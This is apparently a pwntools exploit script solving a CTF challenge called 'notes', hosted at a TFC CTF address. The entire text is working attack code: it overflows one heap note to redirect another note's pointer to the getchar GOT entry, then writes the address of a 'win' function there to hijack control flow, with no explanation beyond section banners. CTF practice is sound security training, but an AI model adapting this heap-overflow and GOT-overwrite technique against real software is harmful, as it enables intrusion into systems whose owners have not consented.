#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notes'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'challs.tfcctf.com', 30204

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

def add(idx, content):
    io.sendline(b'1')
    io.sendlineafter(b'index>', str(idx).encode())
    io.sendlineafter(b'content>', content.encode())
    
def edit(idx, payload):
    io.sendline(b'2')
    io.sendlineafter(b'index>', str(idx).encode())
    io.sendlineafter(b'content>', payload)

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

add(0, 'aaaa')
add(1, 'bbbb')

payload = flat([
    0,
    0,
    0,
    p64(0x21),
    elf.got['getchar']
])

edit(0, payload)
edit(1, flat(elf.sym['win']))

io.interactive()